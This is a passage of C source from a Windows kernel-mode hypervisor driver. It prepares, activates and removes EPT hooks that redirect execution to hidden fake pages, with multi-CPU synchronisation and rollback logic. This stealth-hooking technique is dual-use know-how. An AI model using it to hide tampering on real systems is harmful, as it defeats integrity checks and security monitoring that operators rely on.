            hookEntry->FakePageVirtual = NULL;
            hookEntry->FakePagePhysical = 0;
        }
        hookEntry->PageOwner = page;

        status = EptCreateTrampoline(hookEntry);
        if (!NT_SUCCESS(status)) {
            goto Failure;
        }
        KeAcquireSpinLock(&g_EptHookManager.Lock, &oldIrql);
        if (newPage) {
            InsertTailList(
                &g_EptHookManager.PageList, &page->ListEntry);
            g_EptHookManager.PageCount++;
        }
        InsertTailList(
            &g_EptHookManager.HookList, &hookEntry->ListEntry);
        g_EptHookManager.HookCount++;
        page->SiteCount++;
        KeReleaseSpinLock(&g_EptHookManager.Lock, oldIrql);

        MemoryBarrier();
        *OutTrampoline = hookEntry->TrampolineAddress;
        *OutHookEntry = hookEntry;
        DbgPrint("[EPT-Hook] Prepared site %p at GPA 0x%llx (page sites=%lu, fake=%p)\n",
                 TargetAddress,
                 page->TargetPhysicalAddress,
                 page->SiteCount,
                 page->FakePageVirtual);
        return STATUS_SUCCESS;

Failure:
        if (newPage && page) {
            if (page->FakePageVirtual) {
                MmFreeContiguousMemory(page->FakePageVirtual);
            }
            ExFreePoolWithTag(page, EPT_HOOK_PAGE_TAG);
        }
        if (hookEntry) {
            if (hookEntry->FakePageVirtual) {
                MmFreeContiguousMemory(hookEntry->FakePageVirtual);
            }
            ExFreePoolWithTag(hookEntry, EPT_HOOK_TAG);
        }
        return status;
    }
    __finally {
        ExReleaseFastMutex(&g_EptHookManager.MutationMutex);
    }
}

NTSTATUS
EptHookSetOverlayVisiblePrepared(
    _In_ PEPT_HOOK_ENTRY HookEntry,
    _In_ BOOLEAN Visible)
{
    if (!HookEntry || KeGetCurrentIrql() > APC_LEVEL) {
        return HookEntry ? STATUS_INVALID_DEVICE_STATE
                         : STATUS_INVALID_PARAMETER;
    }

    ExAcquireFastMutex(&g_EptHookManager.MutationMutex);
    __try {
        if (!g_EptHookManager.Initialized ||
            HookEntry->State != EptHookStatePrepared ||
            !HookEntry->PageOwner) {
            return STATUS_INVALID_DEVICE_STATE;
        }
        HookEntry->OverlayVisible = Visible ? TRUE : FALSE;
        return STATUS_SUCCESS;
    }
    __finally {
        ExReleaseFastMutex(&g_EptHookManager.MutationMutex);
    }
}

#if 0 /* superseded by composite page-owner implementation below */
NTSTATUS
EptHookActivate(
    _In_ PEPT_HOOK_ENTRY HookEntry
)
{
    ULONG processorCount;

    if (!HookEntry) {
        return STATUS_INVALID_PARAMETER;
    }
    if (KeGetCurrentIrql() > APC_LEVEL) {
        return STATUS_INVALID_DEVICE_STATE;
    }
    if (!g_EptHookManager.Initialized) {
        return STATUS_NOT_INITIALIZED;
    }

    ExAcquireFastMutex(&g_EptHookManager.MutationMutex);
    __try {
        if (!g_EptHookManager.Initialized) {
            return STATUS_NOT_INITIALIZED;
        }
        if (InterlockedCompareExchange(&HookEntry->Removing, 0, 0) != 0) {
            return STATUS_DEVICE_BUSY;
        }
        if (HookEntry->State == EptHookStateActive) {
            return STATUS_SUCCESS;
        }
        if (HookEntry->State != EptHookStatePrepared) {
            return STATUS_INVALID_DEVICE_STATE;
        }
        if (!g_HypervisorContext.IsActive ||
            !g_HypervisorContext.VcpuData ||
            !HookEntry->FakePagePhysical ||
            !HookEntry->TrampolineAddress) {
            return STATUS_DEVICE_NOT_READY;
        }

        /* Resolve/split only during Activate.  Prepare must remain completely
         * SLAT-pure so the owner can safely publish its callback metadata. */
        processorCount = g_HypervisorContext.ProcessorCount;
        if (processorCount == 0 ||
            processorCount > RTL_NUMBER_OF(HookEntry->TargetPte)) {
            return STATUS_DEVICE_NOT_READY;
        }
        HookEntry->TargetPteCount = 0;
        RtlZeroMemory(
            HookEntry->TargetPte, sizeof(HookEntry->TargetPte));
        RtlZeroMemory(
            HookEntry->OriginalPteValue,
            sizeof(HookEntry->OriginalPteValue));
        if (!EptSetupPerCpuPtesForHook(
                HookEntry->TargetPhysicalAddress, HookEntry)) {
            RtlZeroMemory(
                HookEntry->TargetPte, sizeof(HookEntry->TargetPte));
            return STATUS_DEVICE_NOT_READY;
        }

        /* Validate the complete activation set before the first target-leaf
         * write. Reject stale/shared leaves and any mapping no longer owned
         * by the reserved GPA. Once this succeeds, the batch stores below
         * are non-failing atomic publications. */
        for (ULONG cpuIdx = 0; cpuIdx < processorCount; ++cpuIdx) {
            EPT_PTE_ENTRY observed;

            if (!HookEntry->TargetPte[cpuIdx]) {
                RtlZeroMemory(
                    HookEntry->TargetPte, sizeof(HookEntry->TargetPte));
                RtlZeroMemory(
                    HookEntry->OriginalPteValue,
                    sizeof(HookEntry->OriginalPteValue));
                return STATUS_DEVICE_NOT_READY;
            }
            for (ULONG previous = 0; previous < cpuIdx; ++previous) {
                if (HookEntry->TargetPte[previous] ==
                    HookEntry->TargetPte[cpuIdx]) {
                    DbgPrint("[EPT-Hook] Activation rejected shared leaf for CPUs %u/%u\n",
                             previous, cpuIdx);
                    RtlZeroMemory(
                        HookEntry->TargetPte, sizeof(HookEntry->TargetPte));
                    RtlZeroMemory(
                        HookEntry->OriginalPteValue,
                        sizeof(HookEntry->OriginalPteValue));
                    return STATUS_CONFLICTING_ADDRESSES;
                }
            }

            observed.Value = (ULONG64)InterlockedCompareExchange64(
                (volatile LONG64*)&HookEntry->TargetPte[cpuIdx]->Value,
                0,
                0);
            if (observed.LargePage ||
                !(observed.Read || observed.Write || observed.Execute) ||
                observed.PhysicalAddress !=
                    (HookEntry->TargetPhysicalAddress >> PAGE_SHIFT)) {
                DbgPrint("[EPT-Hook] Activation preflight failed on CPU %u: leaf=0x%llx expected PFN=0x%llx\n",
                         cpuIdx,
                         observed.Value,
                         HookEntry->TargetPhysicalAddress >> PAGE_SHIFT);
                RtlZeroMemory(
                    HookEntry->TargetPte, sizeof(HookEntry->TargetPte));
                RtlZeroMemory(
                    HookEntry->OriginalPteValue,
                    sizeof(HookEntry->OriginalPteValue));
                return STATUS_CONFLICTING_ADDRESSES;
            }
            HookEntry->OriginalPteValue[cpuIdx] = observed.Value;
        }

        HookEntry->TargetPteCount = processorCount;
        MemoryBarrier();
        InterlockedExchange(
            (volatile LONG*)&HookEntry->State,
            (LONG)EptHookStateActive);
        MemoryBarrier();
        for (ULONG cpuIdx = 0; cpuIdx < processorCount; ++cpuIdx) {
            EptSetPteAtomic(HookEntry->TargetPte[cpuIdx],
                            HookEntry->FakePagePhysical >> 12, 0, 0, 1);
        }

        /* Keep activation on the established deferred-INVEPT path.  All leaf
         * stores are already visible; each vCPU invalidates at its next exit. */
        EptIncrementVersion();
        DbgPrint("[EPT-Hook] Activated on %u CPUs: Execute-Only -> FakePage\n",
                 processorCount);
        return STATUS_SUCCESS;
    }
    __finally {
        ExReleaseFastMutex(&g_EptHookManager.MutationMutex);
    }
}
#endif

static VOID
EptHookpPublishCompositePage(_In_ PEPT_HOOK_PAGE Page)
{
    ULONG cpuIndex;

    for (cpuIndex = 0;
         cpuIndex < Page->TargetPteCount &&
         cpuIndex < RTL_NUMBER_OF(Page->TargetPte);
         ++cpuIndex) {
        if (Page->TargetPte[cpuIndex]) {
            EptSetPteAtomic(
                Page->TargetPte[cpuIndex],
                Page->FakePagePhysical >> PAGE_SHIFT,
                0, 0, 1);
        }
    }
    if (Page->OverlaySiteCount != 0) {
        HvOverlayEptAcquireMutation();
        for (cpuIndex = 0;
             cpuIndex < Page->OverlayTargetPteCount &&
             cpuIndex < RTL_NUMBER_OF(Page->OverlayTargetPte);
             ++cpuIndex) {
            if (Page->OverlayTargetPte[cpuIndex]) {
                EptSetPteAtomic(
                    Page->OverlayTargetPte[cpuIndex],
                    Page->FakePagePhysical >> PAGE_SHIFT,
                    0, 0, 1);
            }
        }
        HvOverlayEptReleaseMutation();
    }
    EptInveptAllContexts();
}

static NTSTATUS
EptHookpPrepareOverlayPageLeaves(
    _Inout_ PEPT_HOOK_PAGE Page,
    _In_ ULONG ProcessorCount)
{
    ULONG cpuIndex;

    RtlZeroMemory(
        Page->OverlayTargetPte,
        sizeof(Page->OverlayTargetPte));
    RtlZeroMemory(
        Page->OverlayOriginalPteValue,
        sizeof(Page->OverlayOriginalPteValue));
    Page->OverlayTargetPteCount = 0;
    HvOverlayEptAcquireMutation();
    if (!EptSetupPerCpuOverlayPtesForPage(
            Page->TargetPhysicalAddress, Page)) {
        HvOverlayEptReleaseMutation();
        return STATUS_DEVICE_NOT_READY;
    }
    for (cpuIndex = 0; cpuIndex < ProcessorCount; ++cpuIndex) {
        EPT_PTE_ENTRY observed;
        ULONG previous;

        if (!Page->OverlayTargetPte[cpuIndex]) continue;
        for (previous = 0; previous < cpuIndex; ++previous) {
            if (Page->OverlayTargetPte[previous] ==
                Page->OverlayTargetPte[cpuIndex]) {
                HvOverlayEptReleaseMutation();
                return STATUS_CONFLICTING_ADDRESSES;
            }
        }
        observed.Value = (ULONG64)InterlockedCompareExchange64(
            (volatile LONG64*)&Page->OverlayTargetPte[cpuIndex]->Value,
            0,
            0);
        if (observed.LargePage ||
            !(observed.Read || observed.Write || observed.Execute) ||
            observed.PhysicalAddress !=
                (Page->TargetPhysicalAddress >> PAGE_SHIFT)) {
            HvOverlayEptReleaseMutation();
            return STATUS_CONFLICTING_ADDRESSES;
        }
        Page->OverlayOriginalPteValue[cpuIndex] = observed.Value;
    }
    HvOverlayEptReleaseMutation();
    return STATUS_SUCCESS;
}

static NTSTATUS
EptHookpPreparePageLeaves(
    _Inout_ PEPT_HOOK_PAGE Page,
    _Inout_ PEPT_HOOK_ENTRY ScratchSite)
{
    ULONG processorCount;
    ULONG cpuIndex;

    processorCount = g_HypervisorContext.ProcessorCount;
    if (!g_HypervisorContext.IsActive ||
        !g_HypervisorContext.VcpuData ||
        processorCount == 0 ||
        processorCount > RTL_NUMBER_OF(Page->TargetPte)) {
        return STATUS_DEVICE_NOT_READY;
    }

    RtlZeroMemory(ScratchSite->TargetPte, sizeof(ScratchSite->TargetPte));
    RtlZeroMemory(
        ScratchSite->OriginalPteValue,
        sizeof(ScratchSite->OriginalPteValue));
    ScratchSite->TargetPteCount = 0;
    if (!EptSetupPerCpuPtesForHook(
            Page->TargetPhysicalAddress, ScratchSite)) {
        return STATUS_DEVICE_NOT_READY;
    }

    for (cpuIndex = 0; cpuIndex < processorCount; ++cpuIndex) {
        EPT_PTE_ENTRY observed;
        ULONG previous;

        if (!ScratchSite->TargetPte[cpuIndex]) {
            return STATUS_DEVICE_NOT_READY;
        }
        for (previous = 0; previous < cpuIndex; ++previous) {
            if (ScratchSite->TargetPte[previous] ==
                ScratchSite->TargetPte[cpuIndex]) {
                return STATUS_CONFLICTING_ADDRESSES;
            }
        }
        observed.Value = (ULONG64)InterlockedCompareExchange64(
            (volatile LONG64*)&ScratchSite->TargetPte[cpuIndex]->Value,
            0,
            0);
        if (observed.LargePage ||
            !(observed.Read || observed.Write || observed.Execute) ||
            observed.PhysicalAddress !=
                (Page->TargetPhysicalAddress >> PAGE_SHIFT)) {
            return STATUS_CONFLICTING_ADDRESSES;
        }
        Page->TargetPte[cpuIndex] =
            ScratchSite->TargetPte[cpuIndex];
        Page->OriginalPteValue[cpuIndex] = observed.Value;
    }
    Page->TargetPteCount = processorCount;
    RtlZeroMemory(ScratchSite->TargetPte, sizeof(ScratchSite->TargetPte));
    RtlZeroMemory(
        ScratchSite->OriginalPteValue,
        sizeof(ScratchSite->OriginalPteValue));
    ScratchSite->TargetPteCount = 0;
    if (ScratchSite->OverlayVisible) {
        return EptHookpPrepareOverlayPageLeaves(Page, processorCount);
    }
    return STATUS_SUCCESS;
}

static BOOLEAN
EptHookpPageHasPendingMtf(_In_ PEPT_HOOK_PAGE Page)
{
    ULONG cpuIndex;
    ULONG slot;

    for (cpuIndex = 0;
         cpuIndex < RTL_NUMBER_OF(g_EptHookManager.MtfContext);
         ++cpuIndex) {
        PEPT_MTF_CONTEXT mtf = &g_EptHookManager.MtfContext[cpuIndex];
        if (InterlockedCompareExchange(&mtf->MtfActive, 0, 0) != 0) {
            MemoryBarrier();
            for (slot = 0; slot < EPT_HOOK_MAX_PENDING_PAGES; ++slot) {
                if (mtf->PendingPage[slot] == Page) {
                    return TRUE;
                }
            }
        }
    }
    return FALSE;
}

static NTSTATUS
EptHookpQuiesceCompositePage(
    _Inout_ PEPT_HOOK_PAGE Page,
    _In_ PEPT_HOOK_ENTRY MutationSite,
    _In_ LONG MutationKind)
{
    ULONG oldEpoch;
    ULONG retry;

    if (Page->State == EptHookStateActive) {
        if (Page->MutationKind != EPT_PAGE_MUTATION_NONE ||
            Page->MutationSite != NULL) {
            return STATUS_DEVICE_BUSY;
        }
        Page->MutationSite = MutationSite;
        Page->MutationKind = MutationKind;
        MemoryBarrier();
        InterlockedExchange(
            (volatile LONG*)&Page->State,
            (LONG)EptHookStateQuiescing);

    } else if (Page->State == EptHookStateQuiescing) {
        if (Page->MutationSite != MutationSite ||
            Page->MutationKind != MutationKind) {
            return STATUS_DEVICE_BUSY;
        }
    } else {
        return STATUS_INVALID_DEVICE_STATE;
    }

    /* Every retry advances and drains a fresh epoch.  A leaked root reader
     * must retain the page for a later retry, never pin an unload forever. */
    oldEpoch = EptHookpAdvanceRootEpoch();
    if (!EptHookpWaitRootEpoch(oldEpoch)) {
        return STATUS_DEVICE_BUSY;
    }
    if (EptHookpRestorePageOriginalLeaves(Page) != 0) {
        EptInveptAllContexts();
    }

    for (retry = 0; retry < 100; ++retry) {
        LARGE_INTEGER delay;
        if (!EptHookpPageHasPendingMtf(Page)) {
            break;
        }
        delay.QuadPart = -10000;
        KeDelayExecutionThread(KernelMode, FALSE, &delay);
    }
    if (retry == 100) {
        return STATUS_DEVICE_BUSY;
    }

    if (EptHookpRestorePageOriginalLeaves(Page) != 0) {
        EptInveptAllContexts();
    }
    return STATUS_SUCCESS;
}

static VOID
EptHookpClearPageMutation(_Inout_ PEPT_HOOK_PAGE Page)
{
    Page->MutationKind = EPT_PAGE_MUTATION_NONE;
    MemoryBarrier();
    Page->MutationSite = NULL;
}

NTSTATUS
EptHookActivate(_In_ PEPT_HOOK_ENTRY HookEntry)
{
    NTSTATUS status;
    PEPT_HOOK_PAGE page;
    BOOLEAN quiescedExisting = FALSE;

    if (!HookEntry || KeGetCurrentIrql() > APC_LEVEL) {
        return HookEntry ? STATUS_INVALID_DEVICE_STATE
                         : STATUS_INVALID_PARAMETER;
    }
    if (!g_EptHookManager.Initialized) {
        return STATUS_NOT_INITIALIZED;
    }

    ExAcquireFastMutex(&g_EptHookManager.MutationMutex);
    __try {
        if (!g_EptHookManager.Initialized) {
            return STATUS_NOT_INITIALIZED;
        }
        if (InterlockedCompareExchange(&HookEntry->Removing, 0, 0) != 0) {
            return STATUS_DEVICE_BUSY;
        }
        if (HookEntry->State == EptHookStateActive) {
            return STATUS_SUCCESS;
        }
        if (HookEntry->State != EptHookStatePrepared ||
            !HookEntry->PageOwner ||
            !HookEntry->TrampolineAddress) {
            return STATUS_INVALID_DEVICE_STATE;
        }
        page = HookEntry->PageOwner;
        if (!page->FakePageVirtual || !page->FakePagePhysical) {
            return STATUS_DEVICE_NOT_READY;
        }

        if (page->State == EptHookStateActive) {
            status = EptHookpQuiesceCompositePage(
                page, HookEntry, EPT_PAGE_MUTATION_ACTIVATE);
            if (!NT_SUCCESS(status)) {
                /* No composite byte changed yet: roll an activation timeout
                 * back to the prior active image instead of disabling all
                 * already-active sibling sites. */
                if (page->State == EptHookStateQuiescing &&
                    page->MutationSite == HookEntry &&
                    page->MutationKind == EPT_PAGE_MUTATION_ACTIVATE) {
                    EptHookpClearPageMutation(page);
                    InterlockedExchange(
                        (volatile LONG*)&page->State,
                        (LONG)EptHookStateActive);
                    EptHookpPublishCompositePage(page);
                }
                return status;
            }
            quiescedExisting = TRUE;
        } else if (page->State == EptHookStatePrepared) {
            RtlZeroMemory(page->TargetPte, sizeof(page->TargetPte));
            RtlZeroMemory(
                page->OriginalPteValue,
                sizeof(page->OriginalPteValue));
            RtlZeroMemory(
                page->OverlayTargetPte,
                sizeof(page->OverlayTargetPte));
            RtlZeroMemory(
                page->OverlayOriginalPteValue,
                sizeof(page->OverlayOriginalPteValue));
            page->TargetPteCount = 0;
            page->OverlayTargetPteCount = 0;
            status = EptHookpPreparePageLeaves(page, HookEntry);
            if (!NT_SUCCESS(status)) {
                return status;
            }
        } else {
            return STATUS_DEVICE_BUSY;
        }

        if (quiescedExisting && HookEntry->OverlayVisible &&
            page->OverlaySiteCount == 0) {
            status = EptHookpPrepareOverlayPageLeaves(
                page, g_HypervisorContext.ProcessorCount);
            if (!NT_SUCCESS(status)) {
                EptHookpClearPageMutation(page);
                InterlockedExchange(
                    (volatile LONG*)&page->State,
                    (LONG)EptHookStateActive);
                EptHookpPublishCompositePage(page);
                return status;
            }
        }

        EptHookpRebuildCompositePage(page, HookEntry, NULL);
        HookEntry->State = EptHookStateActive;
        page->ActiveSiteCount++;
        if (HookEntry->OverlayVisible) {
            page->OverlaySiteCount++;
        }
        if (!page->AccountingSite) {
            page->AccountingSite = HookEntry;
        }
        if (quiescedExisting) {
            EptHookpClearPageMutation(page);
        }
        MemoryBarrier();
        InterlockedExchange(
            (volatile LONG*)&page->State,
            (LONG)EptHookStateActive);
        EptHookpPublishCompositePage(page);

        DbgPrint("[EPT-Hook] Activated composite site %p (GPA=0x%llx, active=%lu/%lu)\n",
                 HookEntry->TargetVirtualAddress,
                 page->TargetPhysicalAddress,
                 page->ActiveSiteCount,
                 page->SiteCount);
        return STATUS_SUCCESS;
    }
    __finally {
        ExReleaseFastMutex(&g_EptHookManager.MutationMutex);
    }
}

NTSTATUS
EptHookInstall(
    _In_ PVOID TargetAddress,
    _In_ PVOID HookFunction,
    _Out_opt_ PEPT_HOOK_ENTRY* OutHookEntry
)
{
    PEPT_HOOK_ENTRY hookEntry = NULL;
    PVOID trampoline = NULL;
    NTSTATUS status;

    if (OutHookEntry) {
        *OutHookEntry = NULL;
    }

    status = EptHookPrepare(
        TargetAddress, HookFunction, &hookEntry, &trampoline);
    if (!NT_SUCCESS(status)) {
        return status;
    }

    status = EptHookActivate(hookEntry);
    if (!NT_SUCCESS(status)) {
        NTSTATUS rollbackStatus = EptHookRemove(hookEntry);
        if (!NT_SUCCESS(rollbackStatus)) {
            /* The entry remains linked and Quiescing, so it is never
             * unaccounted.  Hand the retained handle back when the legacy
             * caller supplied storage; otherwise manager RemoveAll remains
             * its explicit owner and retry path. */
            if (OutHookEntry) {
                *OutHookEntry = hookEntry;
            }
            DbgPrint("[EPT-Hook] Activate failed 0x%X; rollback retained %p (0x%X, owner=%s)\n",
                     status,
                     hookEntry,
                     rollbackStatus,
                     OutHookEntry ? "caller" : "manager");
        }
        return status;
    }

    UNREFERENCED_PARAMETER(trampoline);
    if (OutHookEntry) {
        *OutHookEntry = hookEntry;
    }
    return STATUS_SUCCESS;
}

// ============================================================
// Hook 移除
// ============================================================

#if 0 /* superseded by composite page-owner implementation below */
NTSTATUS
EptHookRemove(
    _In_ PEPT_HOOK_ENTRY HookEntry
)
{
    if (!HookEntry) return STATUS_INVALID_PARAMETER;
    if (KeGetCurrentIrql() > APC_LEVEL) {
        return STATUS_INVALID_DEVICE_STATE;
    }
    if (HookEntry->State == EptHookStateRetired) {
        return STATUS_SUCCESS;
    }
    if (InterlockedCompareExchange(&HookEntry->Removing, 1, 0) != 0) {
        return HookEntry->State == EptHookStateRetired
            ? STATUS_SUCCESS
            : STATUS_DEVICE_BUSY;
    }
    return EptHookpRemoveClaimed(HookEntry);
}

static NTSTATUS
EptHookpRemoveClaimed(
    _In_ PEPT_HOOK_ENTRY HookEntry
)
{
    KIRQL oldIrql;
    ULONG cpuIndex;
    ULONG retryCount;
    ULONG oldEpoch;
    BOOLEAN preparedOnly;
    NTSTATUS status = STATUS_SUCCESS;

    if (!HookEntry) {
        return STATUS_INVALID_PARAMETER;
    }
    if (KeGetCurrentIrql() > APC_LEVEL) {
        return STATUS_INVALID_DEVICE_STATE;
    }
    ExAcquireFastMutex(&g_EptHookManager.MutationMutex);

    if (HookEntry->State == EptHookStateRetired) {
        ExReleaseFastMutex(&g_EptHookManager.MutationMutex);
        return STATUS_SUCCESS;
    }
    if (HookEntry->State != EptHookStatePrepared &&
        HookEntry->State != EptHookStateActive &&
        HookEntry->State != EptHookStateQuiescing) {
        status = STATUS_INVALID_DEVICE_STATE;
        goto Exit;
    }

    DbgPrint("[EPT-Hook] Removing hook at %p\n", HookEntry->TargetVirtualAddress);

    preparedOnly = (HookEntry->State == EptHookStatePrepared);

    /* Quiescing is monotonic. A timeout may leave some leaves redirected or
     * may occur after all leaves were restored; either way the same handle is
     * retained and a retry continues withdrawal. Never advertise Active. */
    InterlockedExchange(
        (volatile LONG*)&HookEntry->State,
        (LONG)EptHookStateQuiescing);

    /* Readers that observed Active before the state transition keep the old
     * epoch. New readers use the next epoch and observe Quiescing. */
    oldEpoch = EptHookpAdvanceRootEpoch();
    /* Do not reuse a two-slot epoch while readers from its prior generation
     * still exist. Returning on this timeout allowed a retry (or removal of
     * another hook) to toggle back into the occupied slot. Root readers are
     * bounded VM-exit paths, so drain this generation before releasing the
     * mutation mutex. */
    while (!EptHookpWaitRootEpoch(oldEpoch)) {
        DbgPrint("[EPT-Hook] Waiting for pre-quiesce root readers\n");
    }
    if (preparedOnly) {
        goto UnlinkAndRetire;
    }

    /* First restoration stops new guest execution through the fake leaf.
     * It is intentionally repeated after MTF drains: a completion that had
     * already passed its Active check may still publish FakePage after this
     * first store. Both passes restore the exact saved leaf value. */
    {
        ULONG restoredCount = EptHookpRestoreOriginalLeaves(HookEntry);
        if (restoredCount > 0) {
            EptInveptAllContexts();
            DbgPrint("[EPT-Hook] Restored exact pre-activation leaves on %u CPUs\n",
                     restoredCount);
        }
    }

    // 等待所有 CPU 的 MTF 上下文清除对这个 Hook 的引用
    // 这是防止 use-after-free 的关键步骤
    retryCount = 0;
    while (retryCount < 100) {  // 最多等待约 100ms
        BOOLEAN anyPending = FALSE;

        for (cpuIndex = 0; cpuIndex < 64; cpuIndex++) {
            PEPT_MTF_CONTEXT mtfCtx = &g_EptHookManager.MtfContext[cpuIndex];

            // 检查是否有 MTF pending 到这个 Hook
            if (InterlockedCompareExchange(&mtfCtx->MtfActive, 0, 0) != 0) {
                MemoryBarrier();
                if (mtfCtx->PendingHookEntry == HookEntry) {
                    anyPending = TRUE;
                    break;
                }
            }
        }
        
        if (!anyPending) {
            break;
        }
        
        // 短暂延迟后重试
        if (KeGetCurrentIrql() <= APC_LEVEL) {
            LARGE_INTEGER delay;
            delay.QuadPart = -10000;  // 1ms
            KeDelayExecutionThread(KernelMode, FALSE, &delay);
        }
        retryCount++;
    }

    if (retryCount >= 100) {
        DbgPrint("[EPT-Hook] MTF still pending; retaining quiescing hook for retry\n");
        status = STATUS_TIMEOUT;
        goto Exit;
    }

    /* Close the late-MTF writer window before unlinking the entry. */
    if (EptHookpRestoreOriginalLeaves(HookEntry) > 0) {
        EptInveptAllContexts();
    }

UnlinkAndRetire:
    // 从链表移除
    KeAcquireSpinLock(&g_EptHookManager.Lock, &oldIrql);
    RemoveEntryList(&HookEntry->ListEntry);
    g_EptHookManager.HookCount--;
    KeReleaseSpinLock(&g_EptHookManager.Lock, oldIrql);

    /* Readers in the post-inactivation epoch may have traversed the entry
     * while it was still linked.  Toggle once more and never free until that
     * finite reader set has drained. */
    oldEpoch = EptHookpAdvanceRootEpoch();
    while (!EptHookpWaitRootEpoch(oldEpoch)) {
        DbgPrint("[EPT-Hook] Waiting for retired root readers before free\n");
    }

    // 释放伪造页
    /* Retain entry/fake-page/trampoline metadata until final cleanup. A CPU
     * may already have branched to HookFunction before its C guard. */
    HookEntry->TargetPteCount = 0;
    MemoryBarrier();
    InterlockedExchange(
        (volatile LONG*)&HookEntry->State,
        (LONG)EptHookStateRetired);
    KeAcquireSpinLock(&g_EptHookManager.Lock, &oldIrql);
    InsertTailList(&g_EptHookManager.RetiredHookList, &HookEntry->ListEntry);
    g_EptHookManager.RetiredHookCount++;
    KeReleaseSpinLock(&g_EptHookManager.Lock, oldIrql);

    DbgPrint("[EPT-Hook] Hook removed and retired\n");

    ExReleaseFastMutex(&g_EptHookManager.MutationMutex);
    return STATUS_SUCCESS;

Exit:
    ExReleaseFastMutex(&g_EptHookManager.MutationMutex);
    InterlockedExchange(&HookEntry->Removing, 0);
    return status;
}

NTSTATUS
EptHookRemoveByAddress(
    _In_ PVOID TargetAddress
)
{
    PEPT_HOOK_ENTRY hookEntry = NULL;
    KIRQL oldIrql;

    if (KeGetCurrentIrql() > APC_LEVEL) {
        return STATUS_INVALID_DEVICE_STATE;
    }
    KeAcquireSpinLock(&g_EptHookManager.Lock, &oldIrql);
    for (PLIST_ENTRY link = g_EptHookManager.HookList.Flink;
         link != &g_EptHookManager.HookList;
         link = link->Flink) {
        PEPT_HOOK_ENTRY candidate = CONTAINING_RECORD(
            link, EPT_HOOK_ENTRY, ListEntry);
        if (candidate->TargetVirtualAddress == TargetAddress &&
            InterlockedCompareExchange(
                &candidate->Removing, 1, 0) == 0) {
            hookEntry = candidate;
            break;
        }
    }
    KeReleaseSpinLock(&g_EptHookManager.Lock, oldIrql);
    if (!hookEntry) {
        return STATUS_NOT_FOUND;
    }

    return EptHookpRemoveClaimed(hookEntry);
}

VOID
EptHookRemoveAll(VOID)
{
    for (;;) {
        KIRQL oldIrql;
        PEPT_HOOK_ENTRY hookEntry = NULL;
        NTSTATUS status;

        KeAcquireSpinLock(&g_EptHookManager.Lock, &oldIrql);
        if (!IsListEmpty(&g_EptHookManager.HookList)) {
            PEPT_HOOK_ENTRY candidate = CONTAINING_RECORD(
                g_EptHookManager.HookList.Flink,
                EPT_HOOK_ENTRY,
                ListEntry);
            if (InterlockedCompareExchange(
                    &candidate->Removing, 1, 0) == 0) {
                hookEntry = candidate;
            }
        }
        KeReleaseSpinLock(&g_EptHookManager.Lock, oldIrql);

        if (!hookEntry) break;
        status = EptHookpRemoveClaimed(hookEntry);
        if (!NT_SUCCESS(status)) {
            DbgPrint("[EPT-Hook] RemoveAll retained an entry: 0x%X\n", status);
            break;
        }
    }

    DbgPrint("[EPT-Hook] RemoveAll complete; remaining=%lu\n",
             g_EptHookManager.HookCount);
}
#endif

NTSTATUS
EptHookRemove(_In_ PEPT_HOOK_ENTRY HookEntry)
{
    if (!HookEntry) {
        return STATUS_INVALID_PARAMETER;
    }
    if (KeGetCurrentIrql() > APC_LEVEL) {
        return STATUS_INVALID_DEVICE_STATE;
    }
    if (HookEntry->State == EptHookStateRetired) {
        return STATUS_SUCCESS;
    }
    if (InterlockedCompareExchange(&HookEntry->Removing, 1, 0) != 0) {
        return HookEntry->State == EptHookStateRetired
            ? STATUS_SUCCESS
            : STATUS_DEVICE_BUSY;
    }
    return EptHookpRemoveClaimed(HookEntry);
}

static NTSTATUS
EptHookpRemoveClaimed(_In_ PEPT_HOOK_ENTRY HookEntry)
{
    PEPT_HOOK_PAGE page;
    EPT_HOOK_STATE initialState;
    BOOLEAN pageWasActive;
    BOOLEAN retirePage = FALSE;
    ULONG oldEpoch;
    KIRQL oldIrql;
    NTSTATUS status = STATUS_SUCCESS;

    if (!HookEntry) {
        return STATUS_INVALID_PARAMETER;
    }
    if (KeGetCurrentIrql() > APC_LEVEL) {
        status = STATUS_INVALID_DEVICE_STATE;
        goto ExitWithoutLock;
    }

    ExAcquireFastMutex(&g_EptHookManager.MutationMutex);
    if (HookEntry->State == EptHookStateRetired) {
        ExReleaseFastMutex(&g_EptHookManager.MutationMutex);
        return STATUS_SUCCESS;
    }
    if (HookEntry->State != EptHookStatePrepared &&
        HookEntry->State != EptHookStateActive &&
        HookEntry->State != EptHookStateQuiescing) {
        status = STATUS_INVALID_DEVICE_STATE;
        goto Exit;
    }

    page = HookEntry->PageOwner;
    if (!page || page->State == EptHookStateRetired) {
        status = STATUS_INVALID_DEVICE_STATE;
        goto Exit;
    }
    initialState = HookEntry->State;
    if (page->State == EptHookStateQuiescing &&
        (page->MutationKind != EPT_PAGE_MUTATION_REMOVE ||
         page->MutationSite != HookEntry)) {
        status = STATUS_DEVICE_BUSY;
        goto Exit;
    }
    if ((initialState == EptHookStateActive &&
         page->State != EptHookStateActive) ||
        (initialState == EptHookStateQuiescing &&
         page->State != EptHookStateQuiescing)) {
        status = STATUS_INVALID_DEVICE_STATE;
        goto Exit;
    }
    pageWasActive = HookEntry->PatchInstalled ? TRUE : FALSE;

    if (!page->PageUnlinked) {
        if (pageWasActive) {
            InterlockedExchange(
                (volatile LONG*)&HookEntry->State,
                (LONG)EptHookStateQuiescing);
            status = EptHookpQuiesceCompositePage(
                page, HookEntry, EPT_PAGE_MUTATION_REMOVE);
            if (!NT_SUCCESS(status)) {
                /* Preserve both page and site as Quiescing.  The same handle
                 * owns the bounded retry. */
                goto Exit;
            }
        } else if (page->State == EptHookStateQuiescing) {
            status = STATUS_DEVICE_BUSY;
            goto Exit;
        }

        if (page->SiteCount == 1) {
            /* Stop new root lookups before the final drain, but retain all
             * accounting and the site handle until that drain succeeds. */
            if (!pageWasActive) {
                page->MutationSite = HookEntry;
                page->MutationKind = EPT_PAGE_MUTATION_REMOVE;
                MemoryBarrier();
                InterlockedExchange(
                    (volatile LONG*)&page->State,
                    (LONG)EptHookStateQuiescing);
                InterlockedExchange(
                    (volatile LONG*)&HookEntry->State,
                    (LONG)EptHookStateQuiescing);
            }
            KeAcquireSpinLock(&g_EptHookManager.Lock, &oldIrql);
            RemoveEntryList(&page->ListEntry);
            page->PageUnlinked = TRUE;
            KeReleaseSpinLock(&g_EptHookManager.Lock, oldIrql);
        }
    }

    if (page->PageUnlinked) {
        oldEpoch = EptHookpAdvanceRootEpoch();
        if (!EptHookpWaitRootEpoch(oldEpoch)) {
            status = STATUS_DEVICE_BUSY;
            goto Exit;
        }
